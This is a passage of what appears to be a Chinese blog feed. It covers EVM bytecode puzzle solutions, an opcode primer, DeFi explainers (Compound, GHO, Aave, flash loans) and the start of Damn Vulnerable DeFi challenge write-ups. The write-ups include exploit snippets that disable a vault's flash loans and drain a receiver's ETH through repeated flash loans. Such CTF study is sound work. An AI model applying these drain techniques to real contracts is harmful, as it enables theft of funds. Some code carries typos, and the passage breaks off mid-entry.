XOR</h2><p>题目：</p><pre>pc      opcode  opcode name00      34      CALLVALUE01      38      CODESIZE02      18      XOR03      56      JUMP04      FD      REVERT05      FD      REVERT06      FD      REVERT07      FD      REVERT08      FD      REVERT09      FD      REVERT0A      5B      JUMPDEST0B      00      STOP</pre><p>value是多少？</p><p>分析:CALLVALUE获取数值后入栈，STACK：[x],CODESIZE获取数值为12入栈，STACK：[12, x]<br>异或操作：<br>12：0000，1100<br>0A：0000，1010<br>x： 0000，0110 &#x3D;》6，所以答案为：6,即value为6</p><hr><h2 id="puzzles-5-JUPM1"><a href="#puzzles-5-JUPM1" class="headerlink" title="puzzles 5 JUPM1"></a>puzzles 5 JUPM1</h2><p>题目：</p><pre>        pc      opcode      opcode name00      34          CALLVALUE01      80          DUP102      02          MUL03      610100      PUSH2 010006      14          EQ07      600C        PUSH1 0C09      57          JUMPI0A      FD          REVERT0B      FD          REVERT0C      5B          JUMPDEST0D      00          STOP0E      FD          REVERT0F      FD          REVERT</pre><p>value是多少？</p><p>分析：</p><ul><li>CALLVALUE，STACK-&gt; [x]</li><li>DUP1：STACK-&gt; [x，x]</li><li>MUL：STACK-&gt; [mul_result]</li><li>PUSH2 0100：STACK-&gt; [0100，mul_result]</li><li>EQ：判断stack1和stack2是否相等，若相等，则清除这两个值，并向栈顶存入1，否则存入0</li><li>PUSH1 0C：STACK-&gt; [0C, 1]</li><li>JUMPI：读取stack2的值，如果为1，则跳转到stack1的位置，即0C，满足条件！<br>因此我们需要使得：0100 &#x3D; x*x，0x0100十进制为256，所以x &#x3D; 16，即value为16</li></ul><hr><h2 id="puzzles-6-CALLDATALOAD"><a href="#puzzles-6-CALLDATALOAD" class="headerlink" title="puzzles 6 CALLDATALOAD"></a>puzzles 6 CALLDATALOAD</h2><p>题目：</p><pre>pc      opcode  opcode name02      35        CALLDATALOAD04      FD        REVERT05      FD        REVERT06      FD        REVERT07      FD        REVERT08      FD        REVERT09      FD        REVERT0A      5B        JUMPDEST0B      00        STOP</pre><p>calldataload是 多少？</p><p>分析：</p><ul><li>PUSH1 00，STACK：【0x00】</li><li>CALLDATALOAD：获取input的数据，即calldata，参数为0x00，即从第00位置开始加载</li><li>JUMP想跳转到0A处，所以calldata的值为0x0a，如果我们直接输入0x0a，此时会被转化为：a00000000000000000000000000000000000000000000000000000000000000，这是错的；</li><li>由于calldata的数值总为32字节的倍数，所以此处应该为：0x000000000000000000000000000000000000000000000000000000000000000a</li></ul><hr><h2 id="puzzles-7-EXTCODESIZE"><a href="#puzzles-7-EXTCODESIZE" class="headerlink" title="puzzles 7 EXTCODESIZE"></a>puzzles 7 EXTCODESIZE</h2><p>题目：</p><pre>pc      opcode    opcode name00      36        CALLDATASIZE01      6000      PUSH1 0003      80        DUP104      37        CALLDATACOPY05      36        CALLDATASIZE06      6000      PUSH1 0008      6000      PUSH1 000A      F0        CREATE0B      3B        EXTCODESIZE0C      6001      PUSH1 010E      14        EQ0F      6013      PUSH1 1311      57        JUMPI12      FD        REVERT13      5B        JUMPDEST14      00        STOP</pre><p>calldata是多少？</p><p>分析：逐步分析，</p><pre>00      36        CALLDATASIZE    # [datasize]01      6000      PUSH1 00    # [00, datasize]03      80        DUP1        # [00, 00, datasize]04      37        CALLDATACOPY     # [] data被copy到memory中，栈被清空05      36        CALLDATASIZE    # [datasize]06      6000      PUSH1 00        # [00, datasize]08      6000      PUSH1 00        # [00, 00, datasize]0A      F0        CREATE    # [deployed_address] 栈被清空，从内存中读取数据，创建合约，返回地址 0B      3B        EXTCODESIZE    # [address_code_size] 输入地址，返回合约的size0C      6001      PUSH1 01    # [01, address_code_size]0E      14        EQ    # [1] address_code_size必须为1，后续的才成立0F      6013      PUSH1 1311      57        JUMPI12      FD        REVERT13      5B        JUMPDEST14      00        STOP</pre><p>就是我们传入的数据要的操作码要返回1，利用return操作符</p><pre>pc      opcode    opcode name00      6001      PUSH1 0104      F3        RETURN</pre><p>即 msg.data &#x3D;&#x3D; 0x60016000f3</p><hr><h2 id="puzzles-8-SWAP"><a href="#puzzles-8-SWAP" class="headerlink" title="puzzles 8 SWAP"></a>puzzles 8 SWAP</h2><p>题目：</p><pre>pc      opcode    opcode name00      36        CALLDATASIZE01      6000      PUSH1 0003      80        DUP104      37        CALLDATACOPY05      36        CALLDATASIZE06      6000      PUSH1 0008      6000      PUSH1 000A      F0        CREATE0B      6000      PUSH1 000D      80        DUP10E      80        DUP10F      80        DUP110      80        DUP111      94        SWAP512      5A        GAS13      F1        CALL14      6000      PUSH1 0016      14        EQ17      601B      PUSH1 1B19      57        JUMPI1A      FD        REVERT1B      5B        JUMPDEST1C      00        STOP</pre><p>calldata是多少？<br>分析：</p><pre>00      36        CALLDATASIZE    # [datasize]01      6000      PUSH1 00    # [00, datasize]03      80        DUP1    # [00, 00, datasize]04      37        CALLDATACOPY    # []  copy到内存中05      36        CALLDATASIZE    # [datasize]，直接生成数据，不需要栈参数06      6000      PUSH1 00    # [00, datasize]08      6000      PUSH1 00    # [00, 00, datasize]0A      F0        CREATE    # [deployed_address]0B      6000      PUSH1 00    # [00, deployed_address]0D      80        DUP1    # [00, 00, deployed_address]0E      80        DUP1    # [00, 00, 00, deployed_address]0F      80        DUP1    # [00, 00, 00, 00, deployed_address]10      80        DUP1    # [00, 00, 00, 00, 00, deployed_address]11      94        SWAP5    # [deployed_address, 00, 00, 00, 00, 00]，兑换1st 和 6th，你没有看错1和6，不是512      5A        GAS    # [gasAvail, deployed_address, 00, 00, 00, 00, 00] // 7个参数13      F1        CALL    # [0或1]调用函数，需要是0，0表示失败，1表示成功！（反推的14      6000      PUSH1 00    # [00, 0或1]，需要是016      14        EQ    # [0或1]，需要是117      601B      PUSH1 1B    # [1B, 0或1]，需要是119      57        JUMPI                       1A      FD        REVERT1B      5B        JUMPDEST1C      00        STOP</pre><p>逐步分析后，可得知我们需要做到call调用失败，这就要我们传入的数据revert,类似于puzzles#7</p><pre>pc      opcode    opcode name00      60FD      PUSH1 FD //FD 是revert操作符的编号02      6000      PUSH1 0004      53        MSTORE805      6001      PUSH1 0107      6000      PUSH1 0009      F3        RETURN</pre><p>即calldata&#x3D; 0x60fd60005360016000f3</p><hr><h2 id="puzzles-9-LT"><a href="#puzzles-9-LT" class="headerlink" title="puzzles 9 LT"></a>puzzles 9 LT</h2><pre>pc      opcode    opcode name00      36        CALLDATASIZE01      6003      PUSH1 0303      10        LT04      6009      PUSH1 0906      57        JUMPI07      FD        REVERT08      FD        REVERT09      5B        JUMPDEST0A      34        CALLVALUE0B      36        CALLDATASIZE0C      02        MUL0D      6008      PUSH1 080F      14        EQ10      6014      PUSH1 1412      57        JUMPI13      FD        REVERT14      5B        JUMPDEST15      00        STOP</pre><p>value?<br>calldata?</p><p>分析：就是一个推理题，00-09:datasize&gt;3,0A-12:value*datasize&#x3D;8,datasize&#x3D;4,value&#x3D;2<br>calldata的字节数为4，随意构造calldata&#x3D;0x12345678</p><hr><h2 id="puzzles-10-ISZERO"><a href="#puzzles-10-ISZERO" class="headerlink" title="puzzles 10 ISZERO"></a>puzzles 10 ISZERO</h2><p>题目：</p><pre>pc      opcode      opcode name00      38          CODESIZE01      34          CALLVALUE02      90          SWAP103      11          GT04      6008        PUSH1 0806      57          JUMPI07      FD          REVERT08      5B          JUMPDEST09      36          CALLDATASIZE0A      610003      PUSH2 00030D      90          SWAP10E      06          MOD0F      15          ISZERO10      34          CALLVALUE11      600A        PUSH1 0A13      01          ADD14      57          JUMPI15      FD          REVERT16      FD          REVERT17      FD          REVERT18      FD          REVERT19      5B          JUMPDEST1A      00          STOP</pre><p>value?<br>calldata?</p><p>分析：00-06：value&lt;23;09-0f:calldata mod 3&#x3D;&#x3D;0;10-14:value+0a&#x3D;19,注意19为16进制的数，value&#x3D;15,calldata的字节数为3，随意构造calldta&#x3D;0x123456</p><p>10道EVM puzzles就完成了！！！</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>EVM入门</title>
      <link href="/2024/08/19/EVM%E5%85%A5%E9%97%A8/"/>
      <url>/2024/08/19/EVM%E5%85%A5%E9%97%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="Opcodes"><a href="#Opcodes" class="headerlink" title="Opcodes"></a>Opcodes</h2><p>Opcodes（操作码）是以太坊智能合约的基本单元。我们写的Solidity智能合约会被编译为字节码（bytecode），然后才能在EVM（以太坊虚拟机）上运行。而字节码就是由一系列Opcodes组成的。当用户在EVM中调用这个智能合约的函数时，EVM会解析并执行这些Opcodes，以实现合约逻辑。</p><h2 id="常见的Opcodes"><a href="#常见的Opcodes" class="headerlink" title="常见的Opcodes"></a>常见的Opcodes</h2><p><code>PUSH1</code>: 将一个字节的数据压入堆栈。例如，PUSH1 0x60 就是将 0x60 压入堆栈。<br><code>DUP1</code> : 复制堆栈顶部的一个元素。<br><code>SWAP1</code>: 交换堆栈顶部的前两个元素。</p><p>例如：下面是一个简单的Solidity智能合约，它只有一个add()函数，计算1+1的结果并返回。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.20;</span><br><span class="line"></span><br><span class="line">contract Add &#123;</span><br><span class="line">    function add() public pure returns (uint256 result) &#123;</span><br><span class="line">        result = 1+1;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将合约编译后，我们可以得到合约对应的bytecode:<strong>60806040523480156100…</strong></p><p>通过bytecode，我们可以得到合约对应的opcodes为:<strong>PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 …</strong></p><blockquote><p>我认为需要特别记忆的基本Opcodes:<br>PUSH1:将一个长度为1字节的数据压入堆栈顶部。同理可知：PUSH2就是压入长度为俩个字节的数据进入栈堆顶部<br>ADD:会弹出堆栈顶部的两个元素，计算它们的和，然后将结果压入堆栈。<br>PUSH0:就是将0压入栈堆<br>MUL: 会弹出堆栈顶部的两个元素，计算它们的乘，然后将结果压入堆栈。<br>SUB: 会弹出堆栈顶部的两个元素，第二个元素减去第一个元素，然后将结果压入堆栈<br>DUPx:就是复制第x个元素到栈顶<br>LT:从堆栈中弹出两个元素，比较第二个元素是否小于第一个元素。如果是，那么将1推入堆栈，否则将0推入堆栈。如果堆栈元素不足两个，那么会抛出异常。<br>GT:从堆栈中弹出两个元素，比较第二个元素是否大于第一个元素。如果是，那么将1推入堆栈，否则将0推入堆栈。如果堆栈元素不足两个，那么会抛出异常。<br>EQ:从堆栈中弹出两个元素，比较第二个元素是否等于第一个元素。如果是，那么将1推入堆栈，否则将0推入堆栈。如果堆栈元素不足两个，那么会抛出异常。<br>AND:从栈堆中弹出俩个元素,比较位级,如2(0000 0010)和3(0000 0011),则入栈的是2<br>OR:从栈堆中弹出俩个元素,比较位级,如2(0000 0010)和3(0000 0011),则入栈的是3<br>XOR:它是异或运算,,如2(0000 0010)和3(0000 0011),则入栈的是1(0000 0001),就是比较依次它们2进制的数,俩个0相遇或者俩个1相遇就为0,不同的相遇就为1<br>SHL:指令执行左移位操作，从堆栈中弹出两个元素，将第二个元素左移第一个元素位数，然后将结果推回栈顶。将2（0000 0010）和3（0000 0011）推入堆栈，然后将2左移3位，结果应该为16（0001 0000）。<br>SHR:同上,只不过向右移,字节码将16（0001 0000）和3（0000 0011）推入堆栈，然后将16右移3位，结果应该为2（0000 0010）。<br>MSTORE:指令用于将一个256位（32字节）的值存储到内存中。它从堆栈中弹出两个元素，第一个元素为内存的地址（偏移量 offset），第二个元素为存储的值（value）。<br>STOP:它的作用是停止当前上下文的执行，并成功退出。<br>JUMP:用于无条件跳转到一个新的程序计数器位置。它从堆栈中弹出一个元素，将这个元素设定为新的程序计数器（pc）的值。搭配JUMPDEST(标记一个有效的跳转目标位置)使用<br>JUMP1:用于条件跳转，它从堆栈中弹出两个元素，如果第二个元素（条件，condition）不为0，那么将第一个元素（目标，destination）设定为新的pc的值。<br>SWAP:交换,如SWAP1,交换栈顶与次栈顶,swap2,交换栈顶与第三个元素<br>CALLDATALOAD:从交易或合约调用的data字段加载数据。它从堆栈中弹出calldata的偏移量（offset），然后从calldata的offset位置读取32字节的数据并压入堆栈。如果calldata剩余不足32字节，则补0。<br>CALLDATASIZE:获取交易或合约调用的data字段的字节长度，并压入堆栈。<br>CALLDATACOPY:将data中的数据复制到内存中。它会从堆栈中弹出3个参数(mem_offset, calldata_offset, length)，分别对应写到内存的偏移量，读取calldata的偏移量和长度。<br>CODESIZE:获取当前合约代码的字节长度，然后压入堆栈。</p></blockquote><hr><h2 id="EVM基础"><a href="#EVM基础" class="headerlink" title="EVM基础"></a>EVM基础</h2><p>以太坊虚拟机（EVM）是以太坊区块链中的关键组件，充当开发人员的虚拟计算机或软件平台。这项创新允许创建和部署去中心化应用程序（DApp）以及在以太坊网络上执行智能合约。 EVM 由Vitalik Buterin于 2013 年提出概念，成为以太坊网络的核心，强调了其在决定以太坊区块链中每个区块的状态方面的基础作用。</p><p>EVM就是一个运行环境，就如同Java的运行环境一样，含义，分类都差不多，它包括了堆栈，内存，存储，EVM字节码，有一点编程基础的都知道堆栈，这种先进后出的结构，反正就是一个类似于JVM一样机器，它主要就是运行一些操作符opcode,真正的要理解熟悉opcode操作符，144个，<a href="https://www.evm.codes/?fork=shanghai">点击学习</a>,更多的详细指令参考<a href="https://www.wtf.academy/docs/evm-opcodes-101/">WTF</a>，我就不一一讲了，接下来就是大白话：</p><h2 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h2><ul><li>跨区块链支持：EVM 支持字节码兼容的智能合约的能力使其能够跨各种区块链。 Polygon 和 Avalanche 等多个区块链都利用了此功能，使它们能够利用 EVM 强大的生态系统。</li><li>隔离沙箱环境：EVM 在同一计算机网络内单独操作每个代码段，确保一个应用程序的执行不会影响区块链的其余部分或节点计算机上存储的数据。这种隔离有利于快速高效的开发。</li><li>灵活的开发能力：EVM 擅长执行复杂且定制的智能合约，这对于包括 dApp、 DeFi平台、游戏和NFT在内的各种应用程序至关重要。此外，EVM 周围有一个庞大的开发人员社区，简化了软件构建过程。</li><li>跨操作系统的交叉兼容性：由于区块链网络中 MacOS、Windows 等操作系统的多样性，开发兼容软件可能具有挑战性。 EVM 通过标准化并支持跨多个操作系统执行程序来解决这个问题，而无需单独的代码库。</li></ul><h2 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h2><ul><li>高交易成本（Gas 费） ：使用 EVM 最显着的缺点之一是加密 Gas费成本高昂。由于 EVM 的可扩展性限制，这些费用可能会迅速增加，尤其是在网络流量较高的时期。</li><li>可扩展性挑战：EVM 每秒只能处理有限数量的事务。这种限制可能会导致网络拥塞加剧，进一步推高汽油费。<br>部署智能合约的成本：以太坊的流行性质意味着部署自定义智能合约或更大的应用程序可能会成本高昂。开发人员必须优化其合约以提高效率，消除冗余代码或不必要的功能，并且还必须考虑以太坊区块链上的高存储成本。</li><li>智能合约的不可逆性：一旦部署，区块链上的智能合约就无法更改。如果在部署后发现错误或漏洞，则这种不变性会带来挑战，需要重新部署整个合约，这可能会产生额外的成本。</li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Compound</title>
      <link href="/2024/08/19/Compound/"/>
      <url>/2024/08/19/Compound/</url>
      
        <content type="html"><![CDATA[<h1 id="Compound"><a href="#Compound" class="headerlink" title="Compound"></a>Compound</h1><p>Compound是在Ethereum上运行的软件，旨在奖励分布式计算机网络运行传统货币市场。Compound允许用户将加密货币存入借贷池让借款人使用。而贷方从他们存入的资产赚取利息。 </p><p>存款后，Compound会奖励贷方名为cToken（代表存款）的新加密货币。cToken的例子包括cETH、cBAT以及cDAI。</p><p>每个cToken都可无限转让或交易，但只能兑换最初锁定在协议中的加密货币。整个过程由Compound代码自动处理，代表贷方可以随时提币。</p><p>为了激励这个行为，Compound使用了另一种称为COMP的自家加密货币。每当用户和Compound市场互动时（借入、提取或偿还资产），作为奖励他们都会获得额外的COMP代币。</p><p>简言之，Compound 是一个允许用户借贷代币的智能合约，它与你的银行类似，Compound 把你的钱借给借款人，并随着时间的推移赚取利息。但与银行不同的是，你的利息是从你存入 Compound 的智能合约后开始复利计算的。因为这是一个智能合约，整个流程中没有中间人，因此利息会比传统银行要高。</p><h2 id="运作机制"><a href="#运作机制" class="headerlink" title="运作机制"></a>运作机制</h2><p>Compound 协议让开发者可以基于以太坊建立各种各样的货币市场（money market）。<br>所谓的「货币市场」，其实就是一个个的独立币池单元，每个币池里只有一种代币，协议通过算法来决定这个池子里的币借贷的利率是多少。简单点说，这个算法会基于人们对这个币借贷的供需关系自动计算出利率。</p><p>不管你是来贷款还是放贷，你都是在跟 Compound 协议直接打交道。这一点跟那些点对点的借贷协议不太一样。在点对点的方案里，借贷双方会做匹配，然后你需要跟找你借钱的人（或者借你钱的人）进行沟通，双方自己商定好借款的利率、到期时间和抵押物品等等。</p><p>而在 Compound 协议里，每个代币（比如 Ether、Dai、USDC）都有一个属于自己的借贷市场，里面包含每个用户在这个市场里的余额，以及各笔生效的借贷交易，乃至每段时期的历史利率，等等。</p><p>用户可以通过抵押品的信贷额度无缝地从协议上借钱，你只需要看自己要借哪个币，不需要和别人沟通还款日期、利率，就能马上借钱。借款是实时且可预测的。每个货币市场都有一个由市场决定的浮动利率。</p><h2 id="清算保证"><a href="#清算保证" class="headerlink" title="清算保证"></a>清算保证</h2><p>Compound 协议强制应用了一条规则，即每个账户必须拥有足够的余额能够偿还借款的额度，叫做<strong>抵押率</strong>。每个账户无法做出任何会使「余额／借款额度」低于「抵押率」的行为。比如再借更多的钱或者把抵押款的余额提现。要增大或者重置抵押率，用户可以全额或者部分偿还借款。任何被 Compound 持有的余额，包括用户用来做抵押品的余额，同时也会产生正常的应计利息。</p><p>如果一个用户提供的抵押资产，除以他们信用额度所借的款项，低于抵押率，那他们的抵押资产就会（通过借款资产）被出售，出售的价格是当前市场价格减去清算折扣（liquidation discount）。这个机制会激励系统里的套利者，去快速减少借款人还不了的借款资产的短缺，从而降低协议的风险。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>GHO</title>
      <link href="/2024/08/19/GHO/"/>
      <url>/2024/08/19/GHO/</url>
      
        <content type="html"><![CDATA[<h1 id="GHO"><a href="#GHO" class="headerlink" title="GHO"></a>GHO</h1><p>它是 Aave 协议中唯一一个去中心化、超额抵押的稳定币，作为以太坊主网上的去中心化稳定币，GHO 由用户铸造。与 Aave 协议上的所有借贷一样，用户必须提供抵押品（按特定抵押品比率）才能铸造 GHO。相应地，当用户偿还借贷头寸（或被清算）时，GHO 将返回 Aave 池并被销毁。GHO 铸造者累积的所有利息支付将直接进入Aave DAO 金库，这与用户借入其他资产时收集的标准准备金因子形成鲜明对比，本金将被销毁。</p><p>人们对真正去中心化、超额抵押和可配置的稳定币的需求很大。最近的事件证明了去中心化稳定币在市场波动期间维持稳定价值的用例。GHO 是一种由 Aave Governance 控制的稳定币，在社区支持下，它有潜力成为 DeFi 生态系统持续增长不可或缺的一部分。</p><p>与许多稳定币不同，GHO 的预言机价格是固定的。GHO 等去中心化稳定币是透明的，无法更改。利率由 Aave DAO 定义，偿还的利息将重定向到 DAO 而不是资产供应商。在安全模块中质押 AAVE 的借款人可享受折扣。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Aave学习知识</title>
      <link href="/2024/08/19/Aave%E5%AD%A6%E4%B9%A0%E7%9F%A5%E8%AF%86/"/>
      <url>/2024/08/19/Aave%E5%AD%A6%E4%B9%A0%E7%9F%A5%E8%AF%86/</url>
      
        <content type="html"><![CDATA[<h1 id="Aave"><a href="#Aave" class="headerlink" title="Aave"></a>Aave</h1><h2 id="Aave-1"><a href="#Aave-1" class="headerlink" title="Aave"></a>Aave</h2><p>是一种完全去中心化的、社区管理的协议，Aave 是芬兰语，意思是“幽灵”，最初于 2017 年 11 月推出时被称为 ETHLend。 ETHLend 是一个点对对点借贷系统。后来进行改进才是Aave，用户可以在其中借入和借出加密资产。协议的价值主张是创建一个可供任何拥有加密资产的人使用的替代去中心化资产货币市场。</p><h2 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h2><p>Aave 是一个借贷池系统，使用户可以选择借入、借出和赚取 20 种不同数字资产的利息，而无需中间人。</p><p>想要赚取利息的用户将存入他们想要借出的资金，然后将其收集到流动性池中。当借款人贷款时，他们从这些资金池中提取资金。贷方可以以任何他们认为合适的方式交易或转让这些代币。</p><p>Aave 发行两种类型的代币来促进此活动，$AAVE（原生代币）和 aTokens。<br>$AAVE 令牌有多种使用方式：<br>1，如果支付费用，$AAVE 的所有者可以选择在向公众发布贷款之前查看贷款。</p><p>2， 使用 $AAVE 作为抵押品的用户可以比使用任何其他数字资产借入的金额略多。</p><p>3，代币持有者可以在平台上质押 $AAVE，以获得大约 6% 的 APY 分配。</p><p>aTokens 代币：</p><p>1，这些代币在存款时铸造，赎回时销毁。</p><p>2，它们与存入 Aave 协议的基础资产的价值以 1:1 的比率挂钩。</p><p>3，aTokens 为贷方提供“收据”，允许他们收取存款利息。</p><h2 id="v4"><a href="#v4" class="headerlink" title="v4"></a>v4</h2><p>今年（2024）5月，Avara 公布 Aave V4 版本的升级计划，重点放在进一步提升 Aave 的流动性与资产利用率。Aave V4 版本引入了流动性溢价功能，这是一个根据抵押品风险状况调整借款利率。为每种资产分配风险因子，依据市场和外部风险因素动态调整。风险较低的资产（如以太坊），将享受更低的借贷利率，而风险较高的资产（如山寨币）则相对提高借贷成本。</p><p>Aave V4 版本通过引入一系列创新功能，优化了借贷相关的安全性与用户体验并简化了治理流程：</p><ul><li><p>智能账户和金库的设计大幅提升了用户体验，智能账户允许用户通过单一钱包管理多个仓位。而智能账户实现的金库功能允许用户不直接向流动性层提供抵押品的情况下借款，抵押品将在借款活跃或清算事件发生时被锁定，增加了用户交互的便捷性和安全性。</p></li><li><p>V4 版本还提出了动态风险配置，以在市场条件变化时调整风险参数。用户在借款时会与资产的当前配置关联，而新的资产配置则为新用户提供，避免了影响现有借款人。此外 V4 引入了自动退市机制，简化了资产下架过程。</p></li></ul><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>比银行更高级的银行，它就是一个pool,在这里可以进行存款与借款，方便，信任度高,作为去中心化金融（DeFi）借贷领域的领头羊，Aave 在资产利用率、市场占有率和交易量方面均显著领先于竞争对手，扮演着关键角色。然而，Aave 的领先地位并非不可动摇。协议如 Radiant 和 Compound 已展示出强劲的增长潜力，并推出了具有增长潜力的新版本。为了巩固其市场地位，Aave 可以采取以下策略：加强其核心借贷业务，推动 GHO 的进一步发展并于 Aave 充分融合，建立 V4 版本所设计的 Aave Network ，以及拓展其非借贷业务生态。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>闪电贷</title>
      <link href="/2024/08/07/%E9%97%AA%E7%94%B5%E8%B4%B7/"/>
      <url>/2024/08/07/%E9%97%AA%E7%94%B5%E8%B4%B7/</url>
      
        <content type="html"><![CDATA[<h1 id="闪电贷"><a href="#闪电贷" class="headerlink" title="闪电贷"></a>闪电贷</h1><p>闪电贷（Flash loan）：是一种无抵押、借贷金额无上限（可以借光池中所有的钱）的贷款。它要求借贷人快借快还，快到还款和借款在同一个交易内（同一个以太坊 transaction),在我看来就是非常迅速的借款还款</p><p>首先你要借钱的话，你要写个还钱合约，里面包括了如何赚钱，还本金加利息的数目，开始借款的话，就要实现一个flashloan()闪电贷合约，这个合约首先要先进行一系列的数据验证，再调用你的还钱合约，验证你是否还了本金加利息，如果没有还上，直接 revert 整个交易，让借款无效，从而保证借出方总是安全的。实现闪电贷通常有俩个合约。</p><p>闪电贷的优点：编写闪电贷合约总体并不复杂。使用闪电贷风险也比较小。如果赚钱逻辑失败，变成了亏钱逻辑，不能完成还款，那么也不用担心借来的巨款无力偿还。整个交易将会执行失败，就如同借款从来没有发生过一样。</p><p><a href="https://www.learnblockchain.cn/article/1926">实现你第一笔闪电贷合约</a><br><a href="https://github.com/AmazingAng/WTF-Solidity/blob/main/57_Flashloan/readme.md">闪电贷的极简入门</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>damn-vulnerable-defi题解</title>
      <link href="/2024/08/06/damn-vulnerable-defi%E9%A2%98%E8%A7%A3/"/>
      <url>/2024/08/06/damn-vulnerable-defi%E9%A2%98%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h1 id="Damn-vulnerable-defi"><a href="#Damn-vulnerable-defi" class="headerlink" title="Damn-vulnerable-defi"></a><a href="https://www.damnvulnerabledefi.xyz/">Damn-vulnerable-defi</a></h1><h2 id="Unstoppable"><a href="#Unstoppable" class="headerlink" title="Unstoppable"></a>Unstoppable</h2><p>要求是，使拥有一百万DVI的钱包停止闪电贷的功能</p><p>分析：这个合约的代码在gittub上，要分开去看，这道题的解决就是靠一个基本的闪电贷的知识<br>首先要看闪电贷的函数</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function flashLoan(IERC3156FlashBorrower receiver, address _token, uint256 amount, bytes calldata data)</span><br><span class="line">       external</span><br><span class="line">       returns (bool)</span><br><span class="line">   &#123;</span><br><span class="line">       if (amount == 0) revert InvalidAmount(0); // fail early</span><br><span class="line">       if (address(asset) != _token) revert UnsupportedCurrency(); // enforce ERC3156 requirement</span><br><span class="line">       uint256 balanceBefore = totalAssets();</span><br><span class="line">       if (convertToShares(totalSupply) != balanceBefore) revert InvalidBalance(); // enforce ERC4626 requirement</span><br><span class="line"></span><br><span class="line">       // transfer tokens out + execute callback on receiver</span><br><span class="line">       ERC20(_token).safeTransfer(address(receiver), amount);</span><br><span class="line"></span><br><span class="line">       // callback must return magic value, otherwise assume it failed</span><br><span class="line">       uint256 fee = flashFee(_token, amount);</span><br><span class="line">       if (</span><br><span class="line">           receiver.onFlashLoan(msg.sender, address(asset), amount, fee, data)</span><br><span class="line">               != keccak256(&quot;IERC3156FlashBorrower.onFlashLoan&quot;)</span><br><span class="line">       ) &#123;</span><br><span class="line">           revert CallbackFailed();</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       // pull amount + fee from receiver, then pay the fee to the recipient</span><br><span class="line">       ERC20(_token).safeTransferFrom(address(receiver), address(this), amount + fee);</span><br><span class="line">       ERC20(_token).safeTransfer(feeRecipient, fee);</span><br><span class="line"></span><br><span class="line">       return true;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>revert的关键：  <code>convertToShares(totalSupply) != balanceBefore</code>，首先来看这个totalSupply,很熟悉，在ERC20中见过，又整体看这个合约，其实是继承了ERC20，totalSupply在ERC4626中定义了</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//ERC4626部分合约</span><br><span class="line"></span><br><span class="line">function convertToShares(uint assets) public view virtual returns (uint256)&#123;</span><br><span class="line">    uint256 supply = totalSupply;</span><br><span class="line">    return supply = 0 ? assets : assets.mulDivDown(supply,talalAssets());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>totalAssets()：计算的是当前金库中的资产代币数目</li><li>convertToShares(totalSupply)：totalSupply 是总的 share 代币数目（只有 deposit 或 mint 时才会产生），convertToShares 就是计算：assets * totalSupply &#x2F;totalAssets ()</li></ul><p>从中我们可以看到 supply&#x3D;assets*supply&#x2F;talalAssets(),如果我们让talalAssets()总数增加，而assets不变，就能满足convertToShares(totalSupply) !&#x3D; balanceBefore，所以就只要不通过 depost 或 mint 方法向 UnstoppableVault 中转入 token 即可</p><p>方法：在<strong>Unstoppable.t.sol</strong>测试合约中写我们的攻击合约,记得找对位置</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/**</span><br><span class="line"> * CODE YOUR SOLUTION HERE</span><br><span class="line"> */</span><br><span class="line">function test_unstoppable() public checkSolvedByPlayer &#123;</span><br><span class="line">    vm.startPrank(player);</span><br><span class="line">    taken.transfer(address(vault),1) </span><br><span class="line">    vm.stopPrank();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH</span><br><span class="line"> */</span><br><span class="line"></span><br></pre></td></tr></table></figure><hr><h2 id="Naive-receiver"><a href="#Naive-receiver" class="headerlink" title="Naive receiver"></a>Naive receiver</h2><p>要求是，掏空一个用户已经部署的合约上的ETH</p><p>分析，部署合约，pool的闪电贷手续费为1eth,receiver已经有了10eth,要使 receiver 中的余额为 0，pool 中的余额为 1000+10eth，就是因此只需通过 receiver 向 pool 执行十次闪电贷即可把 10eth 全部通过手续费的方式转给 pool</p><p>方法：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line"></span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;../../src/naive-receiver/FlashLoanReceiver.sol&quot;;</span><br><span class="line">import &quot;../../src/naive-receiver/NaiveReceiverLenderPool.sol&quot;;</span><br><span class="line">import &quot;openzeppelin-contracts/contracts/interfaces/IERC3156FlashBorrower.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract Attacker &#123;</span><br><span class="line">    constructor(address payable _pool, address payable _receiver)&#123;</span><br><span class="line">        NaiveReceiverLenderPool pool = NaiveReceiverLenderPool(_pool);</span><br><span class="line">        for(uint256 i=0; i&lt;10; i++)&#123;</span><br><span class="line">            pool.flashLoan(IERC3156FlashBorrower(_receiver), address(0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE), 1, &quot;0x&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="Truster"><a href="#Truster" class="headerlink" 